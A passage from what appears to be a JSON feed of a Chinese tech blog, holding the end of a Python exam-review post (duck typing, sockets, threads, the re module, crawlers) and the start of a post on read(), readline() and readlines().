operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>this <span class=\"token keyword\">is</span> gradapa</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>this <span class=\"token keyword\">is</span> father<span class=\"token punctuation\">,</span>我重写了父类的方法</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>this <span class=\"token keyword\">is</span> mother<span class=\"token punctuation\">,</span>我重写了父类的方法</pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token number\">100</span></pre></td></tr></table></figure><p>def fly (obj):                                        # 实现飞的功能函数<br />\n obj.fly ()<br />\n 由于 Python 的动态语言特性，传递给函数 fly () 的参数 obj 可以是 任何的类型，只要它有一个 fiy () 的方法即可。动态语言调用实例方法时不检查类型，只要方法存在，参数正确，就可以调用。这就是动态语言的 “鸭子类型”，它并不要求严格的继承体系，一个对象只要 “看起来像鸭子，走起路来像鸭子”，那它就可以被看做是鸭子。</p>\n<p>可能有人会觉得，这些内容很自然啊，没什么不好理解，不觉得多态有什么特殊，Python 就是这样啊！</p>\n<p>如果你学过 JAVA 这一类强类型静态语言，就不会这么觉得了，对于 JAVA，必须指定函数参数的数据类型，只能传递对应参数类型或其子类型的参数，不能传递其它类型的参数。</p>\n<p>拓展：<br />\nJava 中多态性的表现： 多态性，可以理解为一个事物的多种形态。同样 python 中也支持多态，但是是有限的的支持多态性，主要是因为 python 中变量的使用不用声明，所以不存在父类引用指向子类对象的多态体现，同时 python 不支持重载。在 python 中 多态的使用不如 Java 中那么明显，所以 python 中刻意谈到多态的意义不是特别大。</p>\n<h2 id=\"property装饰器\"><a class=\"anchor\" href=\"#property装饰器\">#</a> @property 装饰器</h2>\n<p>Python 内置的 @property 装饰器可以把类的方法伪装成属性调用的方式。也就是本来是 Foo.func () 的调用方法，变成 Foo.func 的方式。在很多场合下，这是一种非常有用的机制。</p>\n<p>详解请参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGl1amlhbmdibG9nLmNvbS9jb3Vyc2UvcHl0aG9uLzQ2\">https://www.liujiangblog.com/course/python/46</span></p>\n<h1 id=\"python网络编程\"><a class=\"anchor\" href=\"#python网络编程\">#</a> Python 网络编程</h1>\n<p>python socket 通信逻辑如下图所示：</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>这张逻辑图，是整个 socket 编程中的重点的重点，你必须将它理解、吃透，然后刻在脑海里，真正成为自己记忆的一部分。</p>\n<p>socket 编程思路：<br />\n服务端：</p>\n<p>创建套接字，绑定套接字到本地 IP 与端口：socket.socket (socket.AF_INET,socket.SOCK_STREAM) , s.bind ()<br />\n 开始监听连接：s.listen ()<br />\n 进入循环，不断接受客户端的连接请求：s.accept ()<br />\n 接收传来的数据，或者发送数据给对方：s.recv () , s.sendall ()<br />\n 传输完毕后，关闭套接字：s.close ()</p>\n<p>客户端:</p>\n<p>创建套接字，连接服务器地址：socket.socket (socket.AF_INET,socket.SOCK_STREAM) , s.connect ()<br />\n 连接后发送数据和接收数据：s.sendall (), s.recv ()<br />\n 传输完毕后，关闭套接字：s.close ()</p>\n<p>创建 TCP Socket：\ts=socket.socket (socket.AF_INET,socket.SOCK_STREAM)<br />\n 创建 UDP Socket：\ts=socket.socket (socket.AF_INET,socket.SOCK_DGRAM)</p>\n<p>注意<br />\n Python3 以后，socket 传递的都是 bytes 类型的数据，字符串需要先转换一下，string.encode () 即可；另一端接收到的 bytes 数据想转换成字符串，只要 bytes.decode () 一下就可以。</p>\n<h1 id=\"python进程与线程\"><a class=\"anchor\" href=\"#python进程与线程\">#</a> Python 进程与线程</h1>\n<p>最近没时间，有时间了深究一下。记下的内容仅仅能过考试就行</p>\n<p>找到一篇概念讲的的很好的博客：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Z1bmN0aW9uX18vYXJ0aWNsZS9kZXRhaWxzLzgwODgzMDg0\">https://blog.csdn.net/function__/article/details/80883084</span></p>\n<p>详细讲解多线程的用法：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGl1amlhbmdibG9nLmNvbS9jb3Vyc2UvcHl0aG9uLzc5\">https://www.liujiangblog.com/course/python/79</span></p>\n<h2 id=\"什么是进程什么是线程\"><a class=\"anchor\" href=\"#什么是进程什么是线程\">#</a> 什么是进程，什么是线程</h2>\n<p>进程是程序（软件，应用）的一个执行实例，每个运行中的程序，可以同时创建多个进程，但至少要有一个。每个进程都提供执行程序所需的所有资源，都有一个虚拟的地址空间、可执行的代码、操作系统的接口、安全的上下文（记录启动该进程的用户和权限等等）、唯一的进程 ID、环境变量、优先级类、最小和最大的工作空间（内存空间）。进程可以包含线程，并且每个进程必须有至少一个线程。每个进程启动时都会最先产生一个线程，即主线程，然后主线程会再创建其他的子线程。</p>\n<p>线程，有时被称为轻量级进程 (Lightweight Process，LWP），是程序执行流的最小单元。一个标准的线程由线程 ID，当前指令指针 (PC），寄存器集合和堆栈组成。另外，线程是进程中的一个实体，是被系统独立调度和分派的基本单位，线程自己不独立拥有系统资源，但它可与同属一个进程的其它线程共享该进程所拥有的全部资源。每一个应用程序都至少有一个进程和一个线程。在单个程序中同时运行多个线程完成不同的被划分成一块一块的工作，称为多线程。<br />\n<img data-src=\"image002.gif\" alt=\"\" /></p>\n<p>一个应用程序通常作为具有多个控制线程的一个进程来实现</p>\n<h2 id=\"线程与进程的区别\"><a class=\"anchor\" href=\"#线程与进程的区别\">#</a> 线程与进程的区别</h2>\n<p>进程与线程区别：</p>\n<ul>\n<li>同一个进程中的线程共享同一内存空间，但进程之间的内存空间是独立的。</li>\n<li>同一个进程中的所有线程的数据是共享的，但进程之间的数据是独立的。</li>\n<li>对主线程的修改可能会影响其他线程的行为，但是父进程的修改（除了删除以外）不会影响其他子进程。</li>\n<li>线程是一个上下文的执行指令，而进程则是与运算相关的一簇资源。</li>\n<li>同一个进程的线程之间可以直接通信，但是进程之间的交流需要借助中间代理来实现。</li>\n<li>创建新的线程很容易，但是创建新的进程需要对父进程做一次复制。</li>\n<li>一个线程可以操作同一进程的其他线程，但是进程只能操作其子进程。</li>\n<li>线程启动速度快，进程启动速度慢（但是两者运行速度没有可比性）。</li>\n</ul>\n<p>由于现代 cpu 已经进入多核时代，并且主频也相对以往大幅提升，多线程和多进程编程已经成为主流。Python 全面支持多线程和多进程编程，同时还支持协程。</p>\n<h2 id=\"线程的优点\"><a class=\"anchor\" href=\"#线程的优点\">#</a> 线程的优点</h2>\n<p>多线程编程具有如下四大类的优点：</p>\n<ul>\n<li>\n<p>响应性：如果一个交互程序采用多线程，那么即使部分阻塞或者执行冗长操作，它仍可以继续执行，从而增加对用户的响应程度。这对于用户界面设计尤其有用。例如，当用户点击一个按钮以便执行一个耗时操作时，想一想会发生什么事。一个单线程应用程序对用户反应会迟钝，直到该操作完成。与之相反，如果耗时操作在一个单独线程内执行，那么应用程序仍可响应用户。</p>\n</li>\n<li>\n<p>资源共享：进程只能通过如共享内存和消息传递之类的技术共享资源。这些技术应由程序员显式地安排。不过，线程默认共享它们所属进程的内存和资源。代码和数据共享的优点是：它允许一个应用程序在同一地址空间内有多个不同活动线程。</p>\n</li>\n<li>\n<p>经济：进程创建所需的内存和资源分配非常昂贵。由于线程能够共享它们所属进程的资源，所以创建和切换线程更加经济。虽然进程创建和管理与线程创建和管理的开销差异的实际测量较为困难，但是前者通常要比后者花费更多时间。例如，对于 Solaris，进程创建要比线程创建慢 30 倍，而且进程切换要比线程切换慢 5 倍。</p>\n</li>\n<li>\n<p>可伸缩性：对于多处理器体系结构，多线程的优点更大，因为线程可在多处理核上并行运行。不管有多少可用 CPU，单线程进程只能运行在一个 CPU 上。</p>\n</li>\n</ul>\n<h2 id=\"线程的缺点\"><a class=\"anchor\" href=\"#线程的缺点\">#</a> 线程的缺点</h2>\n<ul>\n<li>线程也是程序，所以线程需要占用内存，线程越多占用内存也越多；</li>\n<li>多线程需要协调和管理，所以需要 CPU 时间跟踪线程；</li>\n<li>线程之间对共享资源的访问会相互影响，必须解决竞用共享资源的问题；</li>\n<li>线程太多会导致控制太复杂，最终可能造成很多 Bug；</li>\n</ul>\n<h2 id=\"线程同步\"><a class=\"anchor\" href=\"#线程同步\">#</a> 线程同步</h2>\n<p>多个线程共享同一个资源就会存在线程安全问题， 当 两个或两个以上的线程需要共享资源，它们需要某种方法来确定资源在某一刻仅被一个线程占用。达到此目的的过程叫做同步（synchronization），这时候，我们需要引入线程 “同步” 机制，即各位线程之间要有个先来后到，不能一窝蜂挤上去抢作一团。 线程同步的真实意思和字面意思恰好相反。 线程同步的真实意思，其实是 “排队”：几个线程之间要排队，一个一个对共享资源进行操作，而不是同时进行操作。<br />\nPython threading 模块提供了 Lock/RLock、Condition、queue、Event 等对象来实现线程同步。</p>\n<p>详细讲解：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xlc291ci9hcnRpY2xlL2RldGFpbHMvODg4MDgxMzk=\">https://blog.csdn.net/Lesour/article/details/88808139</span></p>\n<h1 id=\"python正则表达式\"><a class=\"anchor\" href=\"#python正则表达式\">#</a> Python 正则表达式</h1>\n<p>详解见：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGl1amlhbmdibG9nLmNvbS9jb3Vyc2UvcHl0aG9uLzc0\">https://www.liujiangblog.com/course/python/74</span></p>\n<p>在 Python 中，通过内置的 re 模块提供对正则表达式的支持。正则表达式会被编译成一系列的字节码，然后由通过 C 编写的正则表达式引擎进行执行。该引擎自从 Python1.6 被内置以来，近 20 年时间未有发生过变化.</p>\n<h2 id=\"re函数\"><a class=\"anchor\" href=\"#re函数\">#</a> re 函数</h2>\n<p>提供了下面的方法进行字符串的查找、替换和分割等各种处理操作。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:right\">方法</th>\n<th style=\"text-align:right\">描述</th>\n<th style=\"text-align:right\">返回值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:right\">compile(pattern[, flags])</td>\n<td style=\"text-align:right\">根据包含正则表达式的字符串创建模式对象</td>\n<td style=\"text-align:right\">re 对象</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">search(pattern, string[, flags])</td>\n<td style=\"text-align:right\">在字符串中查找</td>\n<td style=\"text-align:right\">第一个匹配到的对象或者 None</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">match(pattern, string[, flags])</td>\n<td style=\"text-align:right\">在字符串的开始处匹配模式</td>\n<td style=\"text-align:right\">在字符串开头匹配到的对象或者 None</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">split(pattern, string[, maxsplit=0,flags])</td>\n<td style=\"text-align:right\">根据模式的匹配项来分割字符串</td>\n<td style=\"text-align:right\">分割后的字符串列表</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">findall(pattern, string,flags)</td>\n<td style=\"text-align:right\">列出字符串中模式的所有匹配项</td>\n<td style=\"text-align:right\">所有匹配到的字符串列表</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">sub(pat,repl, string[,count=0,flags])</td>\n<td style=\"text-align:right\">将字符串中所有的 pat 的匹配项用 repl 替换</td>\n<td style=\"text-align:right\">完成替换后的新字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">finditer(pattern, string,flags)</td>\n<td style=\"text-align:right\">将所有匹配到的项生成一个迭代器</td>\n<td style=\"text-align:right\">所有匹配到的字符串组合成的迭代器</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">subn(pat,repl, string[,count=0,flags])</td>\n<td style=\"text-align:right\">在替换字符串后，同时报告替换的次数</td>\n<td style=\"text-align:right\">完成替换后的新字符串及替换次数</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">escape（string）</td>\n<td style=\"text-align:right\">将字符串中所有特殊正则表达式字符串转义</td>\n<td style=\"text-align:right\">转义后的字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">purge(pattern)</td>\n<td style=\"text-align:right\">清空正则表达式</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">template(pattern[,flags])</td>\n<td style=\"text-align:right\">编译一个匹配模板</td>\n<td style=\"text-align:right\">模式对象</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">fullmatch(pattern, string[, flags])</td>\n<td style=\"text-align:right\">match 方法的全字符串匹配版本</td>\n<td style=\"text-align:right\">类似 match 的返回值</td>\n</tr>\n</tbody>\n</table>\n<p>同时还定义了下面几种匹配模式，单个大写字母是缩写，单词是完整模式名称，引用方法为 re.A 或者 re.ASCII，两者都可以，注意全部是大写：</p>\n<pre><code>A  ：ASCII       \nI  ：IGNORECASE  \nL  ：LOCALE      \nM  ：MULTILINE  \nS  ：DOTALL      \nX  ：VERBOSE    \nU  ：UNICODE\n</code></pre>\n<h2 id=\"三大搜索函数\"><a class=\"anchor\" href=\"#三大搜索函数\">#</a> 三大搜索函数</h2>\n<p>match(pattern, string, flags=0)<br />\n match () 方法会在给定字符串的开头进行匹配，如果匹配不成功则返回 None，匹配成功返回一个匹配对象，这个对象有个 group () 方法，可以将匹配到的字符串给出。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> ret <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>match<span class=\"token punctuation\">(</span><span class=\"token string\">r\"abc\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"ab1c123\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> re<span class=\"token punctuation\">.</span>match<span class=\"token punctuation\">(</span><span class=\"token string\">r\"abc\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"abc123\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">&lt;</span>_sre<span class=\"token punctuation\">.</span>SRE_Match <span class=\"token builtin\">object</span><span class=\"token punctuation\">;</span> span<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> match<span class=\"token operator\">=</span><span class=\"token string\">'abc'</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>match<span class=\"token punctuation\">(</span><span class=\"token string\">r\"abc\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"abc123\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token string\">'abc'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>对于一个&lt;_sre.SRE_Match object; span=(0, 3), match='abc'>对象，span指的是匹配到的字符在字符串中的位置下标，</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>分别对应start和end。需要注意的是不包括end位置的下标，它是右开口的。具体如下：</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>match<span class=\"token punctuation\">(</span><span class=\"token string\">r\"abc\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"abc123\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>end<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>span<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token string\">'abc'</span></pre></td></tr></table></figure><p>search(pattern, string, flags=0)<br />\n 在文本内查找，返回第一个匹配到的字符串。它的返回值类型和使用方法与 match () 是一样的，唯一的区别就是查找的位置不用固定在文本的开头。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">r\"abc\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"123abc456abc789\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">&lt;</span>_sre<span class=\"token punctuation\">.</span>SRE_Match <span class=\"token builtin\">object</span><span class=\"token punctuation\">;</span> span<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> match<span class=\"token operator\">=</span><span class=\"token string\">'abc'</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token string\">'abc'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>end<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token number\">6</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>span<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>findall(pattern, string, flags=0)<br />\n 作为 re 模块的三大搜索函数之一，findall () 和 match ()、search () 的不同之处在于，前两者都是单值匹配，找到一个就忽略后面，直接返回不再查找了。而 findall 是全文查找，它的返回值是一个匹配到的字符串的列表。这个列表没有 group () 方法，没有 start、end、span，更不是一个匹配对象，仅仅是个列表！如果一项都没有匹配到那么返回一个空列表。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">r\"abc\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"123abc456abc789\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token string\">'abc'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'abc'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj<span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#37>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    obj<span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>AttributeError<span class=\"token punctuation\">:</span> <span class=\"token string\">'list'</span> <span class=\"token builtin\">object</span> has no attribute <span class=\"token string\">'group'</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> obj <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">r\"ABC\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"123abc456abc789\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h1 id=\"python爬虫\"><a class=\"anchor\" href=\"#python爬虫\">#</a> Python 爬虫</h1>\n<h2 id=\"介绍\"><a class=\"anchor\" href=\"#介绍\">#</a> 介绍</h2>\n<p>什么是爬虫<br />\n爬虫：一段自动抓取互联网信息的程序，从互联网上抓取对于我们有价值的信息</p>\n<p>数据抓取（也称为网络数据提取或网页爬取）是指从网上获取数据，并将获取到的数据转化为结构化的数据，最终可以将数据存储到本地计算机或数据库的一种技术～</p>\n<p>Python 是一门非常适合开发网络爬虫的编程语言，提供了如 urllib、re、requests、json、pyquery 等模块，同时又有很多成型框架，如 Scrapy 框架、PySpider 爬虫系统等。</p>\n<h2 id=\"url\"><a class=\"anchor\" href=\"#url\">#</a> URL</h2>\n<p>URL 的全称统一资源定位符 (Uniform Resource Locator) 是对可以从互联网上得到的资源的位置和访问方法的一种简洁的表示，是互联网上标准资源的地址。互联网上的每个文件都有一个唯一的 URL，它包含的信息指出文件的位置以及浏览器应该怎么处理它。</p>\n<h2 id=\"模块\"><a class=\"anchor\" href=\"#模块\">#</a> 模块</h2>\n<p>Python 3.x 版本后的 urllib 和 urllib2</p>\n<p>在 Python 3 以后的版本中，urllib2 这个模块已经不单独存在（也就是说当你 import urllib2 时，系统提示你没这个模块），urllib2 被合并到了 urllib 中，叫做 urllib.request 和 urllib.error 。</p>\n<h1 id=\"思维导图\"><a class=\"anchor\" href=\"#思维导图\">#</a> 思维导图</h1>\n<p>右键新标签打开<br />\n<img data-src=\"Python%20%E7%9F%A5%E8%AF%86%E7%82%B9.jpg\" alt=\"\" /></p>\n<h1 id=\"总结\"><a class=\"anchor\" href=\"#总结\">#</a> 总结</h1>\n<p>精力有限，只能总结这么多了。</p>\n<p>复习这么多考试肯定没问题了 (ಥ_ಥ) 。</p>\n<p>这一次总结确实收获不少，充分认识了自己的不足，还有很多需要学习的方面，有机会读读《Python 网络编程基础》这本书，觉得会对学习 web 安全有很大的帮助。</p>\n<h1 id=\"收集自以下\"><a class=\"anchor\" href=\"#收集自以下\">#</a> 收集自以下</h1>\n<p>很多链接都放在文章中了</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGl1amlhbmdibG9nLmNvbS9jb3Vyc2UvcHl0aG9uLw==\">https://www.liujiangblog.com/course/python/</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8xNDkyNDc1MzM=\">https://zhuanlan.zhihu.com/p/149247533</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGlhb3h1ZWZlbmcuY29tL3dpa2kvMTAxNjk1OTY2MzYwMjQwMA==\">https://www.liaoxuefeng.com/wiki/1016959663602400</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZmF0MzkvcC83MTU5ODgxLmh0bWw=\">https://www.cnblogs.com/fat39/p/7159881.html</span></p>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/Python%E4%B8%ADread-%E3%80%81readline-%E5%92%8Creadlines-%E4%B8%89%E8%80%85%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E7%94%A8%E6%B3%95/",
            "url": "https://or0kit.github.io/Programming/Python/Python%E4%B8%ADread-%E3%80%81readline-%E5%92%8Creadlines-%E4%B8%89%E8%80%85%E9%97%B4%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E7%94%A8%E6%B3%95/",
            "title": "Python中read()、readline()和readlines()三者间的区别和用法",
            "date_published": "2020-12-07T00:32:01.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<blockquote>\n<p>源自<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veXVuMTEwOC9wLzg5NjczMzQuaHRtbA==\"> https://www.cnblogs.com/yun1108/p/8967334.html</span></p>\n</blockquote>\n<p>众所周知在 python 中读取文件常用的三种方法：read (),readline (),readlines ()，今天看项目是又忘记他们的区别了。以前看书的时候觉得这东西很简单，一眼扫过，待到用时却也只知道有这么几个方法，不懂得它的原理与用法。也许吧，没有永远的记忆，况且根本没有用心去记它。话不多说，来一起看看详细的介绍：</p>\n<p>假设 a.txt</p>\n<h1 id=\"一-readsize方法\"><a class=\"anchor\" href=\"#一-readsize方法\">#</a> 一、read ([size]) 方法</h1>\n<p>read ([size]) 方法从文件当前位置起读取 size 个字节，若无参数 size，则表示读取至文件结束为止，它范围为字符串对象</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"a.txt\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>lines <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">print</span> lines</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>lines<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>输出结果：</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Hello</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Welcome</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>What <span class=\"token keyword\">is</span> the fuck<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token builtin\">type</span> <span class=\"token string\">'str'</span><span class=\"token operator\">></span> <span class=\"token comment\">#字符串类型</span></pre></td></tr></table></figure><h1 id=\"二-readline方法\"><a class=\"anchor\" href=\"#二-readline方法\">#</a> 二、readline () 方法</h1>\n<p>从字面意思可以看出，该方法每次读出一行内容，所以，读取时占用内存小，比较适合大文件，该方法返回一个字符串对象。</p>\n<figure class=\"highlight 